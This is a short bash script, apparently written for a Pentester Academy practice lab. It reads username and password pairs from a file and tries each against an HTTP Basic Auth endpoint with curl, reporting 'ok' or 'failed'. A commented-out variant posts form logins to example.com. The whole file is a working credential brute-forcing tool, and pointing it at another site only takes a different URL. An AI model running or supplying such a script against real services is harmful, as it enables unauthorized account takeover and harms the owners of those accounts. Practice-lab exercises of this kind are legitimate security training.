#!/bin/bash
#
# Need to create input file as follow:
# user1 pass1
# user2 pass2
#
# Copyright 2020 Marcos Azevedo (aka pylinux) : psylinux[at]gmail.com
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.

if [ $# -ne 1 ];then
   echo "Usage: ./script <input-file>"
   exit 1
fi

while read user pass; do
#curl -iL --fail --data-urlencode user="$user" --data-urlencode password="$pass" http://example.com/login 1>/dev/null 2>&1
curl -X POST --data "" -iL --fail --basic -u $user:$pass http://pentesteracademylab.appspot.com/lab/webapp/basicauth 1>/dev/null 2>&1
   if [ $? -eq 0 ];then
      echo "ok"
   elif [ $? -ne 0 ]; then
      echo "failed"
   fi
done < $1
